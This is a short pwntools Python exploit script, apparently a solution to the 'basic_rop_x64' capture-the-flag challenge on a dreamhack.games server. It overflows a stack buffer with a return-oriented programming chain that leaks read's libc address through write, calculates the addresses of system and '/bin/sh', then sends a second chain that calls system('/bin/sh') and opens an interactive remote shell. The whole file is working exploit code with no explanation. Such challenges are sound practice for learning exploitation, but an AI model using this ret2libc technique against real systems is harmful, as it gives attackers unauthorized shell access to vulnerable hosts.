from pwn import *

binary = "./basic_rop_x64"
l = ELF("./libc.so.6")
e = ELF(binary)
# p = process(binary)
p = remote("host3.dreamhack.games", 13861)

rsi = 0x0000000000400881 # pop rsi ; pop r15 ; ret
rdi = 0x0000000000400883 # pop rdi ; ret

write_plt = e.plt['write']
read_got = e.got['read']
main = e.symbols['main']

payload = b"A" * 0x40
payload += b"B" *0x8
payload += p64(rsi) 
payload += p64(read_got)
payload += b"C" * 0x8 
payload += p64(write_plt)
payload += p64(main)

p.send(payload)
p.recvuntil(b"A" * 0x40)
read_libc = p.recvn(8)

print("read_libc: " , hex(u64(read_libc)))

libc_base = u64(read_libc) - l.symbols['read']
system_libc = libc_base + l.symbols['system']
binsh = libc_base + next(l.search(b"/bin/sh"))

log.info("libc_base: " + hex(libc_base))
log.info("system_libc: " + hex(system_libc))
log.info("binsh: " + hex(binsh))

payload = b"A" * 0x40
payload += b"B" *0x8
payload += p64(rdi)
payload += p64(binsh)
payload += p64(system_libc)

p.send(payload)

p.interactive()